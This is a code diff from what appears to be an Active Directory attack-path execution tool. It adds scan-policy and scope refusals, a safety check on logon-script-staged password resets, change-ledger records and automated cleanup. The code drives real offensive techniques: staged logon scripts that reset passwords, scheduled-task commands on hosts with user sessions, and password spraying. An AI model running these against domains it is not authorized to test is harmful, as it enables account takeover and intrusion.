+    (a not-run status goes back to ``discovered``), the ``excluded_by_scan_policy``
+    note naming the technique's check, and a ``step_blocked`` /
+    ``not_executed`` event. The report, the coverage block and the web CTEM read
+    it through ``annotate_policy_exclusions``, so they word it identically. The
+    refusal itself was already explained and recorded once by
+    ``gate_chained_technique``.
+    """
+    from adscan_core.scan_policy.annotate import status_is_not_run  # noqa: PLC0415
+
+    relation = str(refusal.get("relation") or "")
+    check_id = str(refusal.get("check_id") or "") or scan_policy_enforcement.check_id_for(
+        shell, relation=relation
+    )
+    title = scan_policy_enforcement.check_title(shell, check_id)
+    settle_status = "discovered" if status_is_not_run(pre_step_status) else pre_step_status
+    _update_attack_path_step_status_at_index(
+        shell,
+        domain=domain,
+        summary=summary,
+        step_index=step_index - 1,
+        status=settle_status,
+        notes=scan_policy_enforcement.scan_policy_note(check_id),
+    )
+    _record_attack_path_execution_event(
+        shell,
+        domain=domain,
+        summary=summary,
+        event_stage="step_blocked",
+        message=f"{title} {scan_policy_enforcement.REFUSAL_SUFFIX}",
+        step_index=step_index,
+        total_steps=total_steps,
+        executable_step_index=executable_step_index,
+        last_executable_idx=last_executable_idx,
+        action=action,
+        from_label=from_label,
+        to_label=to_label,
+        step_status="not_executed",
+        reason=scan_policy_enforcement.NOT_EXECUTED_REASON,
+    )
 
 
 # ── NTLMv1 coerce→relay execution dispatch (sub-project #3) ────────────────────
@@ -2024,6 +2840,12 @@ def offer_attack_path_execution(
     )
     meta = annotated.get("meta") or {}
     support_status = str(meta.get("execution_support_status") or "").strip().lower()
+    if support_status == scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED:
+        _refuse_path_for_scan_policy(shell, domain=domain, summary=annotated)
+        return False
+    if support_status == _EXECUTION_STATUS_OUTSIDE_SCOPE:
+        _refuse_path_outside_engagement_scope(shell, domain=domain, summary=annotated)
+        return False
     if support_status in {"unsupported", "blocked"}:
         reason = str(meta.get("execution_support_reason") or "").strip()
         print_warning(
@@ -2085,7 +2907,15 @@ def offer_attack_path_execution(
     # runs and why. It never blocks the operator who goes fast (basic is one line,
     # off is silent).
     render_didactic_for_path(shell, annotated)
-    if not Confirm.ask("Execute this attack path now?", default=True):
+    run_id = new_run_id()
+    execution_mode = prompt_execution_mode(
+        shell,
+        domain=domain,
+        summary=annotated,
+        run_id=run_id,
+        default_mode=resolve_default_execution_mode(shell),
+    )
+    if execution_mode is None:
         return False
     execute_selected_attack_path(
         shell,
@@ -2094,6 +2924,8 @@ def offer_attack_path_execution(
         context_username=context_username,
         context_password=context_password,
         search_mode_label=search_mode_label,
+        execution_mode=execution_mode,
+        run_id=run_id,
     )
     return True
 
@@ -2117,7 +2949,33 @@ def _path_is_supported_for_execution(summary: dict[str, Any]) -> bool:
     return str(meta.get("execution_support_status") or "").strip().lower() not in {
         "unsupported",
         "blocked",
+        scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED,
+        _EXECUTION_STATUS_OUTSIDE_SCOPE,
     }
+
+
+#: Readiness statuses of a route that cannot START here at all, so it is never
+#: offered as an execution choice: the scan policy excludes its first pending
+#: step, or that step acts outside the engagement scope. Both stay in the
+#: listing, mapped, with the reason the overlay recorded.
+_NOT_OFFERABLE_SUPPORT_STATUSES: frozenset[str] = frozenset(
+    {scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED, _EXECUTION_STATUS_OUTSIDE_SCOPE}
+)
+
+
+def _path_offerable_for_execution(summary: dict[str, Any]) -> bool:
+    """Whether a route may appear as a choice in the execution offer.
+
+    False only for a route whose first pending step the readiness overlay
+    marked as excluded by the scan policy or outside the engagement scope:
+    selecting it could only produce a refusal, and a relayed offer with it
+    preselected would let silence or a stray click pick a route the policy
+    forbids. Every other route (unsupported, blocked, needing a credential,
+    already exploited) stays offered for its detail and pivot flows.
+    """
+    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
+    status = str((meta or {}).get("execution_support_status") or "").strip().lower()
+    return status not in _NOT_OFFERABLE_SUPPORT_STATUSES
 
 
 def attack_path_session_signature(summary: dict[str, Any]) -> tuple | None:
@@ -2350,6 +3208,8 @@ def _summarize_non_actionable_paths(
     reasons = {
         "exploited": 0,
         "blocked": 0,
+        "excluded_by_scan_policy": 0,
+        "outside_engagement_scope": 0,
         "unsupported": 0,
         "unavailable": 0,
         "needs_context": 0,
@@ -2383,6 +3243,12 @@ def _summarize_non_actionable_paths(
         )
         if support_status == "blocked":
             reasons["blocked"] += 1
+            continue
+        if support_status == scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED:
+            reasons["excluded_by_scan_policy"] += 1
+            continue
+        if support_status == _EXECUTION_STATUS_OUTSIDE_SCOPE:
+            reasons["outside_engagement_scope"] += 1
             continue
         if not _path_is_supported_for_execution(summary):
             reasons["unsupported"] += 1
@@ -2463,6 +3329,8 @@ def _format_non_actionable_reason_summary(reasons: dict[str, int]) -> str:
     labels = (
         ("exploited", "exploited"),
         ("blocked", "blocked"),
+        ("excluded_by_scan_policy", "excluded by scan policy"),
+        ("outside_engagement_scope", "outside the engagement scope"),
         ("unsupported", "unsupported"),
         ("unavailable", "unavailable"),
         ("needs_context", "needs_context"),
@@ -2542,9 +3410,10 @@ def _attack_path_step_source_actor_reason(
     return f"missing credential for source principal {exec_username}"
 
 
-# Host-session relations whose acting principal is resolved by a DEDICATED
-# handler (not by owning the source host). The generic ownership gate defers to
-# that handler and only confirms a controlled principal exists to attempt it.
+# Host-session relations the start-step gate offers whenever a controlled
+# principal exists. Their acting principal is the local-admin holder carried from
+# the prior access step in the path (``resolve_step_execution_actor``, through
+# the carry_forward bucket), never ownership of the source host.
 _HOST_SESSION_SELF_RESOLVED_RELATIONS: frozenset[str] = frozenset({"hassession"})
 
 
@@ -2723,12 +3592,10 @@ def _attack_path_step_source_is_actionable_in_domain(
             return True, ""
         return False, "no authenticated credential available"
 
-    # HasSession is exploited via ADMIN ACCESS to the SOURCE HOST (steal a
-    # logged-on session's token), NOT by owning the host account. Its acting
-    # principal is resolved by the dedicated HasSession handler from the path
-    # context (a prior AdminTo, or the path's applies-to principal), so the
-    # generic ownership gate only confirms a controlled principal exists to
-    # attempt it and defers the precise host-access decision to that handler.
+    # HasSession is exercised through ADMIN ACCESS to the SOURCE HOST, NOT by
+    # owning the host account. The executor resolves its actor through the actor
+    # SSOT, which carries the local-admin holder from the prior access step, so
+    # this gate only confirms a controlled principal exists to attempt it.
     if key in _HOST_SESSION_SELF_RESOLVED_RELATIONS:
         if (
             context_username
@@ -3202,6 +4069,23 @@ def _attack_path_step_has_executable_context(
     )
 
 
+def _existing_step_cancel_message(step_index: int, action: str) -> str:
+    """Operator-facing explanation for a path stopped at a non-bypassable step.
+
+    Shown when the operator declines to re-run a previously processed step that
+    ADscan cannot continue past. Without it the path returned to the menu with
+    no output at all, which reads as a command that silently does nothing.
+    """
+    safe_action = rich_markup_escape(action or "this step")
+    return (
+        f"Attack path stopped at step #{step_index} ({safe_action}): it has not "
+        "been completed with the credentials currently available, and the "
+        "remaining steps depend on it. Launch the path again and accept the "
+        "re-run to retry that step, or obtain the credential it was meant to "
+        "produce first."
+    )
+
+
 def _attack_path_processed_step_is_bypassable(
     shell: Any,
     *,
@@ -3273,6 +4157,14 @@ def _attack_path_actionable_start_indices(
             str(step_item.get("status") or "").strip().lower()
             in _NON_RERUNNABLE_STEP_STATUSES
         ):
+            continue
+        # S3: a step the scan policy excludes is never an actionable start.
+        if scan_policy_enforcement.step_excluded(shell, step_item):
+            print_info_debug(
+                "[attack_paths] scan-policy excluded step not offered as a start "
+                f"step: index={idx} "
+                f"action={mark_sensitive(str(step_item.get('action') or ''), 'detail')}"
+            )
             continue
         step_details = (
             step_item.get("details")
@@ -4276,7 +5168,8 @@ def _resolve_golden_cert_execution_user(
     if isinstance(creds, dict) and creds:
         from_user = _normalize_account(from_label or "")
         cred_keys = {str(k).lower(): str(k) for k in creds.keys()}
-        if from_user.endswith("$") and from_user in cred_keys:
+        source_kind = str(_resolve_from_node_kind(shell, domain, from_label) or "").lower()
+        if source_kind == "computer" and from_user in cred_keys:
             selected = cred_keys[from_user]
             print_info_debug(
                 "adcsesc5: Using CA machine credential from step source: "
@@ -5716,6 +6609,41 @@ def _execute_writelogonscript_force_change_password_strategy(
             },
         )
 
+    # The staged payload IS a password reset of ``next_target_user``, run by the
+    # victim's logon instead of by ADscan, so it is classified exactly like the
+    # ForceChangePassword choke point classifies a direct reset: an account a
+    # running system depends on is refused in every mode, before anything is
+    # written to the share.
+    from adscan_internal.services.password_reset_target import (  # noqa: PLC0415
+        password_reset_verdict,
+    )
+
+    next_target_domain = (
+        next_target_label.rsplit("@", 1)[-1].strip().lower()
+        if "@" in next_target_label
+        else domain
+    )
+    reset_verdict = password_reset_verdict(
+        shell,
+        domain=next_target_domain or domain,
+        account=next_target_user,
+        label=next_target_label,
+    )
+    if reset_verdict.hard_blocked:
+        print_warning(
+            "ForceChangePassword not executed for safety: "
+            + reset_verdict.client_safe_reason
+        )
+        return (
+            "blocked",
+            {
+                "blocked_kind": DANGEROUS_DESTRUCTIVE_MARKER,
+                "reason": reset_verdict.client_safe_reason,
+                "client_safe_reason": reset_verdict.client_safe_reason,
+                "next_target_user": next_target_user,
+            },
+        )
+
     non_interactive = is_non_interactive(shell)
     fcp_policy = _resolve_password_policy_for_execution(
         shell,
@@ -5811,7 +6739,7 @@ def _execute_writelogonscript_force_change_password_strategy(
             f"target={mark_sensitive(to_label, 'user')} "
             f"script_path={mark_sensitive(stale_managed_script_path, 'path')}"
         )
-    if _is_audit_mode(shell):
+    if _writelogonscript_needs_confirmation(shell):
         marked_target = mark_sensitive(to_label, "user")
         marked_executor = mark_sensitive(exec_username, "user")
         marked_next_target = mark_sensitive(
@@ -5966,7 +6894,7 @@ def _execute_writelogonscript_force_change_password_strategy(
     # ledger finalize() report them manual_required naming the object.
     _wls_file_change_id: str | None = None
     _wls_scriptpath_change_id: str | None = None
-    _wls_ledger = getattr(shell, "environment_change_ledger", None)
+    _wls_ledger = ledger_or_warn(shell)
     if _wls_ledger is not None:
         try:
             from adscan_internal.services import (  # noqa: PLC0415
@@ -5995,10 +6923,10 @@ def _execute_writelogonscript_force_change_password_strategy(
             _wls_ledger.set_revert_metadata(
                 _wls_file_change_id,
                 remediation_command=(
-                    'Remove the staged logon script from the share and confirm it is '
-                    'gone:\n'
+                    'Remove the staged logon script from the share, then confirm it is '
+                    'gone. The check should print False.\n'
                     f'  Remove-Item -LiteralPath "{_wls_unc}" -Force\n'
-                    f'  Test-Path "{_wls_unc}"   # must return False'
+                    f'  Test-Path "{_wls_unc}"'
                 ),
                 remediation_object_dn=_wls_unc,
             )
@@ -6029,6 +6957,35 @@ def _execute_writelogonscript_force_change_password_strategy(
             telemetry.capture_exception(_wls_exc)
             print_exception(exception=_wls_exc)
 
+    # The third change: the staged script resets the next user's password when
+    # that user logs on. It runs on the target's own logon, outside ADscan's
+    # observation, so the record states exactly that and never claims the reset
+    # happened; once ADscan confirms the new credential authenticates, the record
+    # is upgraded to a confirmed reset (_confirm_writelogonscript_password_reset).
+    from adscan_internal.services import cleanup_taxonomy as _wls_pw_tax  # noqa: PLC0415
+    from adscan_internal.services.directory_write_ledger import (  # noqa: PLC0415
+        record_password_reset,
+    )
+
+    _wls_password_change_id = record_password_reset(
+        shell,
+        domain=domain,
+        target_domain=domain,
+        target_user=next_target_user,
+        exec_username=exec_username,
+        method=(
+            "WriteLogonScript: the staged logon script resets this password the "
+            f"next time {_extract_account_name_from_label(to_label) or target_object} "
+            "logs on"
+        ),
+        remediation_command=_wls_pw_tax.MANUAL_PASSWORD_PENDING_LOGON,
+        detail={
+            "reason": "logon_script_payload",
+            "reset_observed": False,
+            "logon_script_target": target_object,
+        },
+    )
+
     return (
         "payload_staged",
         {
@@ -6041,6 +6998,7 @@ def _execute_writelogonscript_force_change_password_strategy(
             "uploaded_file_path": upload_result.uploaded_file_path,
             "_wls_file_change_id": _wls_file_change_id,
             "_wls_scriptpath_change_id": _wls_scriptpath_change_id,
+            "_wls_password_change_id": _wls_password_change_id,
             "script_relative_path": payload.script_path_value,
             "script_filename": payload.filename,
             "scriptpath_target_object": target_object,
@@ -6077,6 +7035,32 @@ def _execute_writelogonscript_force_change_password_strategy(
             "cleanup_pending": True,
         },
     )
+
+
+def _confirm_writelogonscript_password_reset(
+    shell: Any, *, change_id: Any, target_user: str
+) -> None:
+    """Upgrade the pending logon-script reset record once the reset is proven.
+
+    ADscan authenticated with the password the script set, so the reset did run:
+    the record keeps ``manual_required`` and now carries the confirmed-reset
+    command instead of the "check whether it ran" one. Never raises.
+    """
+    ledger = ledger_or_warn(shell)
+    if ledger is None or not change_id or not target_user:
+        return
+    from adscan_internal.services import cleanup_taxonomy as _tax  # noqa: PLC0415
+
+    try:
+        ledger.mark_manual_required(
+            str(change_id),
+            reason=_tax.MANUAL_REASON_NOT_ATTEMPTED,
+            remediation_command=_tax.MANUAL_PASSWORD.replace("TARGET", target_user),
+            remediation_object_dn=target_user,
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
 
 
 def _mark_writelogonscript_cleanup_panel(
@@ -6285,6 +7269,132 @@ def _poll_writelogonscript_followup_credential(
         }
 
 
+def _revert_writelogonscript_writes(
+    shell: Any,
+    *,
+    domain: str,
+    domain_data: dict[str, Any],
+    target_host: str,
+    spn_host: str | None,
+    kdc_ip: str | None,
+    share_name: str,
+    uploaded_file_path: str,
+    target_object: str,
+    previous_script_path: str,
+    previous_readable: bool,
+    creator_username: str,
+    creator_secret: str,
+    file_change_id: Any,
+    scriptpath_change_id: Any,
+) -> tuple[bool, str, bool, str]:
+    """Undo the two WriteLogonScript writes through the shared revert precedence.
+
+    The staged script is deleted over SMB and re-read as absent; ``scriptPath``
+    is put back to the value read before the overwrite and re-read. Each runs
+    as the client cleanup account, then a verified privileged credential, then
+    the account that made the change, with every attempt recorded on its ledger
+    entry. A ``scriptPath`` whose original value was never read is not guessed:
+    its record is settled ``manual_required`` with the native command.
+
+    Returns:
+        ``(file_ok, file_error, scriptpath_ok, scriptpath_error)``.
+    """
+    from adscan_internal.services import cleanup_taxonomy as _wls_tax  # noqa: PLC0415
+    from adscan_internal.services.cleanup_verification import (  # noqa: PLC0415
+        VERIFY_ATTRIBUTE,
+        VERIFY_SMB_PATH,
+    )
+    from adscan_internal.services.revert_credentials import (  # noqa: PLC0415
+        run_ldap_attribute_restore,
+        run_revert_with_precedence,
+    )
+    from adscan_internal.services.smb_transport import (  # noqa: PLC0415
+        remove_unc_path_confirmed,
+    )
+
+    ledger = ledger_or_warn(shell)
+    file_cid = str(file_change_id or "") or None
+    sp_cid = str(scriptpath_change_id or "") or None
+    relative_path = uploaded_file_path.lstrip("\\")
+    unc = f"\\\\{target_host}\\{share_name}\\{relative_path}"
+
+    def _delete_staged_script(candidate: Any) -> tuple[bool, str | None]:
+        return remove_unc_path_confirmed(
+            candidate.smb_config(
+                target_ip=target_host,
+                target_hostname=spn_host or target_host,
+                kdc_ip=kdc_ip,
+            ),
+            unc,
+        )
+
+    file_result = run_revert_with_precedence(
+        shell,
+        ledger=ledger if file_cid else None,
+        change_id=file_cid,
+        domain=domain,
+        purpose="file_uploaded",
+        revert_and_confirm=_delete_staged_script,
+        verification_method=VERIFY_SMB_PATH,
+        manual_instructions=(
+            "Remove the staged logon script from the share and confirm it is gone:\n"
+            f'  Remove-Item -LiteralPath "{unc}" -Force\n'
+            f'  Test-Path "{unc}"'
+        ),
+        object_dn=unc,
+        creator_username=creator_username,
+        creator_secret=creator_secret,
+        creator_domain=domain,
+        description="Staged logon script removal",
+    )
+    file_error = "" if file_result.confirmed else str(
+        file_result.last_error or "The staged logon script could not be removed."
+    )
+
+    manual_scriptpath = _wls_tax.MANUAL_LOGON_SCRIPT_PATH.replace(
+        "TARGET", target_object
+    ).replace("ORIGINAL_SCRIPT", previous_script_path or "<original value>")
+    if not previous_readable:
+        error = "Original scriptPath value was not captured; automatic revert skipped."
+        if ledger is not None and sp_cid:
+            try:
+                ledger.mark_manual_required(
+                    sp_cid,
+                    reason=_wls_tax.MANUAL_REASON_REVERT_FAILED,
+                    remediation_command=manual_scriptpath,
+                    remediation_object_dn=target_object,
+                    error=error,
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                print_exception(exception=exc)
+        return file_result.confirmed, file_error, False, error
+
+    dc_ip = str(resolve_dc_ip(domain_data) or target_host)
+    sp_result = run_ldap_attribute_restore(
+        shell,
+        ledger=ledger if sp_cid else None,
+        change_id=sp_cid,
+        domain=domain,
+        purpose="logon_script_path_modified",
+        dc_ip=dc_ip,
+        dc_fqdn=spn_host if spn_host and spn_host != dc_ip else None,
+        target=target_object,
+        snapshot={"scriptPath": [previous_script_path] if previous_script_path else []},
+        verification_method=VERIFY_ATTRIBUTE,
+        manual_instructions=manual_scriptpath,
+        object_dn=target_object,
+        creator_username=creator_username,
+        creator_secret=creator_secret,
+        creator_domain=domain,
+        description="scriptPath restore",
+    )
+    sp_error = "" if sp_result.confirmed else str(
+        sp_result.last_error or "scriptPath restore could not be confirmed."
+    )
+    return file_result.confirmed, file_error, sp_result.confirmed, sp_error
+
+
 def _attempt_writelogonscript_cleanup_if_ready(
     shell: Any,
     *,
@@ -6292,9 +7402,6 @@ def _attempt_writelogonscript_cleanup_if_ready(
     summary: dict[str, Any],
 ) -> None:
     """Cleanup staged WriteLogonScript artifacts once the downstream credential exists."""
-    from adscan_internal.services import ExploitationService
-    from adscan_internal.services.smb_path_access_service import SMBPathAccessService
-
     steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
     if not isinstance(steps, list):
         return
@@ -6340,42 +7447,25 @@ def _attempt_writelogonscript_cleanup_if_ready(
             if isinstance(getattr(shell, "domains_data", {}), dict)
             else {}
         )
-        use_kerberos = _prepare_kerberos_for_smb_execution(
-            shell,
-            operation_name="WriteLogonScript cleanup",
-            domain=domain,
-            username=cleanup_user,
-            credential=cleanup_password or "",
-            domain_data=cleanup_domain_data
-            if isinstance(cleanup_domain_data, dict)
-            else {},
-        )
+        if not isinstance(cleanup_domain_data, dict):
+            cleanup_domain_data = {}
         spn_host, spn_kdc_ip = _resolve_smb_spn_target(
             shell,
             target_host=target_host,
             domain=domain,
-            domain_data=cleanup_domain_data
-            if isinstance(cleanup_domain_data, dict)
-            else {},
+            domain_data=cleanup_domain_data,
         )
 
         cleanup_notes = dict(details)
         cleanup_notes["cleanup_checked_at"] = datetime.now(UTC).isoformat()
         cleanup_notes["cleanup_trigger_user"] = next_target_user
 
-        if (
-            not cleanup_user
-            or not cleanup_password
-            or not target_host
-            or not share_name
-            or not uploaded_file_path
-            or not target_object
-        ):
+        if not target_host or not share_name or not uploaded_file_path or not target_object:
             cleanup_notes.update(
                 {
                     "cleanup_status": "failed",
                     "cleanup_pending": True,
-                    "cleanup_error": "Missing cleanup credential or artifact metadata.",
+                    "cleanup_error": "Missing cleanup artifact metadata.",
                 }
             )
             update_edge_status_by_labels(
@@ -6393,141 +7483,41 @@ def _attempt_writelogonscript_cleanup_if_ready(
                 target_user=next_target_user,
                 uploaded_file_path=uploaded_file_path,
                 target_object=target_object,
-                error_summary="Missing cleanup credential or artifact metadata.",
+                error_summary="Missing cleanup artifact metadata.",
             )
             continue
 
-        smb_service = SMBPathAccessService()
-        delete_result = smb_service.delete_file(
+        # Both writes are undone through the shared revert precedence (the
+        # client cleanup account, a verified privileged credential, then the
+        # account that made the change), each attempt recorded on its ledger
+        # entry and settled reverted_confirmed only by a confirming re-read.
+        file_ok, file_error, revert_success, revert_error = _revert_writelogonscript_writes(
+            shell,
+            domain=domain,
+            domain_data=cleanup_domain_data,
             target_host=target_host,
-            share_name=share_name,
-            file_path=uploaded_file_path,
-            username=cleanup_user,
-            password=cleanup_password,
-            auth_domain=domain,
-            use_kerberos=use_kerberos,
-            kdc_host=spn_kdc_ip if use_kerberos else None,
             spn_host=spn_host,
+            kdc_ip=spn_kdc_ip,
+            share_name=share_name,
+            uploaded_file_path=uploaded_file_path,
+            target_object=target_object,
+            previous_script_path=previous_script_path,
+            previous_readable=previous_readable,
+            creator_username=cleanup_user,
+            creator_secret=cleanup_password or "",
+            file_change_id=details.get("_wls_file_change_id"),
+            scriptpath_change_id=details.get("_wls_scriptpath_change_id"),
         )
-        service = ExploitationService()
-        revert_success = False
-        revert_error = ""
-        if previous_readable:
-            revert_result = service.acl.set_user_logon_script(
-                pdc_host=target_host,
-                domain=domain,
-                username=cleanup_user,
-                password=cleanup_password,
-                target_object=target_object,
-                script_path=previous_script_path if previous_script_path else None,
-                kerberos=use_kerberos,
-                timeout=180,
-            )
-            revert_success = bool(revert_result.success)
-            revert_error = str(
-                revert_result.error_message or revert_result.raw_output or ""
-            ).strip()
-        else:
-            revert_error = (
-                "Original scriptPath value was not captured; automatic revert skipped."
-            )
+        cleanup_ok = bool(file_ok and revert_success)
 
-        cleanup_ok = bool(delete_result.success and revert_success)
-
-        # Settle the ledger records for the staged file and the scriptPath
-        # overwrite. reverted_confirmed is fail-closed: the staged file needs
-        # a confirmed delete, and the scriptPath needs a confirming re-read
-        # proving the value is no longer the ADscan-managed one. Anything less
-        # is manual_required with the native remediation naming the object.
-        _wls_ledger = getattr(shell, "environment_change_ledger", None)
-        if _wls_ledger is not None:
-            from adscan_internal.services import (  # noqa: PLC0415
-                cleanup_taxonomy as _wls_tax,
-            )
-
-            _wls_file_cid = details.get("_wls_file_change_id")
-            _wls_sp_cid = details.get("_wls_scriptpath_change_id")
-            _wls_unc_target = str(
-                cleanup_notes.get("target")
-                or f"{share_name}\\{uploaded_file_path}"
-            )
-            if _wls_file_cid:
-                try:
-                    if delete_result.success:
-                        _wls_ledger.mark_reverted_confirmed(
-                            _wls_file_cid,
-                            verification_method="writelogonscript_file_delete",
-                            min_credential_principal=cleanup_user,
-                        )
-                    else:
-                        _wls_ledger.mark_manual_required(
-                            _wls_file_cid,
-                            reason=_wls_tax.MANUAL_REASON_REVERT_FAILED,
-                            remediation_command=(
-                                'Remove the staged logon script from the share:\n'
-                                f'  Remove-Item -LiteralPath "{_wls_unc_target}" -Force'
-                            ),
-                            remediation_object_dn=_wls_unc_target,
-                            error=str(delete_result.error_message or "Staged file delete failed."),
-                        )
-                except Exception as _wls_sexc:  # noqa: BLE001
-                    telemetry.capture_exception(_wls_sexc)
-            if _wls_sp_cid:
-                _wls_scriptpath_gone = False
-                if revert_success:
-                    try:
-                        _wls_readback = service.acl.get_object_attributes(
-                            pdc_host=target_host,
-                            domain=domain,
-                            username=cleanup_user,
-                            password=cleanup_password,
-                            target_object=target_object,
-                            attribute_names=("scriptPath",),
-                            kerberos=use_kerberos,
-                            timeout=60,
-                        )
-                        _wls_cur = ""
-                        if getattr(_wls_readback, "success", False):
-                            _wls_cur = str(
-                                _wls_readback.attributes.get("scriptPath") or ""
-                            ).strip()
-                        # Confirmed when the live value is no longer an
-                        # ADscan-managed script path.
-                        _wls_scriptpath_gone = getattr(
-                            _wls_readback, "success", False
-                        ) and not _is_adscan_managed_logon_script_path(_wls_cur)
-                    except Exception as _wls_rexc:  # noqa: BLE001
-                        telemetry.capture_exception(_wls_rexc)
-                        _wls_scriptpath_gone = False
-                try:
-                    if _wls_scriptpath_gone:
-                        _wls_ledger.mark_reverted_confirmed(
-                            _wls_sp_cid,
-                            verification_method="writelogonscript_scriptpath_reread",
-                            min_credential_principal=cleanup_user,
-                        )
-                    else:
-                        _wls_ledger.mark_manual_required(
-                            _wls_sp_cid,
-                            reason=_wls_tax.MANUAL_REASON_REVERT_FAILED,
-                            remediation_command=_wls_tax.MANUAL_LOGON_SCRIPT_PATH.replace(
-                                "TARGET", target_object
-                            ).replace(
-                                "ORIGINAL_SCRIPT", previous_script_path or "<original value>"
-                            ),
-                            remediation_object_dn=target_object,
-                            error=str(revert_error or "scriptPath restore could not be confirmed."),
-                        )
-                except Exception as _wls_sexc:  # noqa: BLE001
-                    telemetry.capture_exception(_wls_sexc)
         cleanup_notes.update(
             {
                 "cleanup_pending": not cleanup_ok,
                 "cleanup_status": "success" if cleanup_ok else "failed",
                 "cleanup_completed_at": datetime.now(UTC).isoformat(),
-                "cleanup_file_deleted": bool(delete_result.success),
+                "cleanup_file_deleted": bool(file_ok),
                 "cleanup_scriptpath_reverted": bool(revert_success),
-                "cleanup_file_error": delete_result.error_message or "",
+                "cleanup_file_error": file_error or "",
                 "cleanup_scriptpath_error": revert_error,
             }
         )
@@ -6553,7 +7543,7 @@ def _attempt_writelogonscript_cleanup_if_ready(
             uploaded_file_path=uploaded_file_path,
             target_object=target_object,
             error_summary=(
-                delete_result.error_message
+                file_error
                 or revert_error
                 or "One or more automatic cleanup operations failed."
             ),
@@ -6562,12 +7552,26 @@ def _attempt_writelogonscript_cleanup_if_ready(
 
 def _extract_password_spray_step_metadata(
     details: dict[str, Any],
+    *,
+    shell: Any = None,
+    domain: str = "",
 ) -> tuple[str | None, str | None, str | None]:
-    """Return spray metadata persisted in one PasswordSpray path step."""
+    """Return spray metadata persisted in one PasswordSpray path step.
+
+    The graph records the accepted password as a credential-store reference,
+    never inline, so the value is resolved through the shell's store (a legacy
+    inline value from an old workspace is still honoured first).
+    """
     spray_type = str(details.get("spray_type") or "").strip() or None
     spray_category = str(details.get("spray_category") or "").strip() or None
     password_value = details.get("password")
     password = password_value if isinstance(password_value, str) else None
+    if password is None and shell is not None:
+        from adscan_internal.services.graph_secret_store import (  # noqa: PLC0415
+            resolve_note_secret_for_shell,
+        )
+
+        password = resolve_note_secret_for_shell(shell, domain, details, "password") or None
     return spray_type, spray_category, password
 
 
@@ -6987,7 +7991,18 @@ def _run_hassession_schtask_command_native(
     if not result.success and result.error:
         output = (output + "\n" + result.error).strip() if output else result.error
 
-    return bool(result.success), output
+    # The task running is not the command succeeding: a payload the host
+    # refused ("System error 5 ... Access is denied") still runs and still
+    # writes its output. Only a definitive non-zero exit flips the result; an
+    # unread exit status keeps the dispatch verdict, as before.
+    succeeded = bool(result.success) and result.command_succeeded is not False
+    first_line = next((ln.strip() for ln in output.splitlines() if ln.strip()), "")
+    print_info_debug(
+        f"[hassession-native] {log_suffix}: dispatched={bool(result.success)} "
+        f"exit={'unknown' if result.command_succeeded is None else ('ok' if result.command_succeeded else 'failed')} "
+        f"output={mark_sensitive(first_line[:160] or '(none)', 'detail')}"
+    )
+    return succeeded, output
 
 
 def _run_hassession_schtask_command(
@@ -7071,6 +8086,54 @@ def _resolve_hassession_host_and_user(
     return None, to_user or from_user or None
 
 
+def _resolve_session_followup_context(
+    shell: Any,
+    *,
+    domain: str,
+    steps: list[dict[str, Any]],
+    step_index: int,
+    relation: str,
+    from_label: str,
+) -> tuple[str | None, str | None, str | None]:
+    """Resolve the host and session user a ScheduledTask / DumpLSASS step acts on.
+
+    The two follow-ups are self-loops on the session user (``user -> X -> user``),
+    so the step itself names no host. The host is the one the preceding
+    ``HasSession`` step of the SAME path starts at: the follow-up exists only
+    because that edge arrived at this user, which is what
+    :func:`manufactured_followup_primary_step_index` looks up (label-based, so it
+    never depends on host resolution).
+
+    Returns ``(host_address, host_label, session_user)``. ``host_address`` and
+    ``host_label`` are ``None`` when no preceding HasSession step names a
+    resolvable host; ``session_user`` is the follow-up's own principal.
+    """
+    session_user = _normalize_account(from_label) or None
+    primary_index = manufactured_followup_primary_step_index(
+        steps=steps,
+        step_index=step_index,
+        relation=relation,
+        from_label=from_label,
+    )
+    if primary_index is None:
+        return None, None, session_user
+    primary = steps[primary_index - 1]
+    if str(primary.get("action") or "").strip().lower() != "hassession":
+        return None, None, session_user
+    primary_details = (
+        primary.get("details") if isinstance(primary.get("details"), dict) else {}
+    )
+    host_label = str(primary_details.get("from") or "").strip()
+    if not host_label:
+        return None, None, session_user
+    host_address = resolve_netexec_target_for_node_label(
+        shell, domain, node_label=host_label
+    )
+    if not isinstance(host_address, str) or not host_address.strip():
+        return None, host_label, session_user
+    return host_address.strip(), host_label, session_user
+
+
 def _extract_group_name_from_label(value: str) -> str:
     """Extract group name from canonical labels like ``GROUP@DOMAIN``."""
     raw = str(value or "").strip()
@@ -7087,29 +8150,52 @@ def _resolve_users_from_principal_label(
     domain: str,
     principal_label: str,
 ) -> list[str]:
-    """Resolve candidate users from a principal label (user or group)."""
-    normalized_user = _normalize_account(principal_label)
-    if _is_valid_domain_username(normalized_user):
-        return [normalized_user]
+    """Resolve the accounts a principal label can act as (user, computer or group).
 
-    group_name = _extract_group_name_from_label(principal_label)
-    if not group_name:
+    The kind comes from the principal-kind SSOT (graph node, then membership
+    snapshot), never from the label's shape: a group named without a space
+    (``ServerAdmins``) passes a sAMAccountName syntax check, and reading it as a
+    user returned a "user" with no credential, so a proven access step granted
+    through that group carried no foothold into the next step.
+
+    * user / computer: the account itself (a computer acts as its machine account);
+    * group: its members, closure-aware, from the group-membership SSOT, falling
+      back to the directory member lookup when no snapshot is available;
+    * unknown: nothing. The caller reports that no actor holds the access.
+    """
+    normalized = _normalize_account(principal_label)
+    kind = str(_resolve_from_node_kind(shell, domain, principal_label) or "").lower()
+    if kind in {"user", "computer"}:
+        return [normalized] if normalized else []
+    if kind != "group":
+        print_info_debug(
+            "[exec-user] No actor from principal "
+            f"{mark_sensitive(str(principal_label or '?'), 'node')}: neither the "
+            "attack graph nor the membership snapshot records what kind of "
+            "principal it is."
+        )
         return []
-    members = resolve_group_user_members(
-        shell,
-        domain,
-        group_name,
-        enabled_only=True,
-        max_results=500,
+
+    from adscan_internal.cli.ace_step_execution import (  # noqa: PLC0415
+        _group_member_sams,
     )
+
+    members = _group_member_sams(shell, domain, principal_label)
     if members is None:
-        return []
-    valid_members = [
-        user
-        for user in members
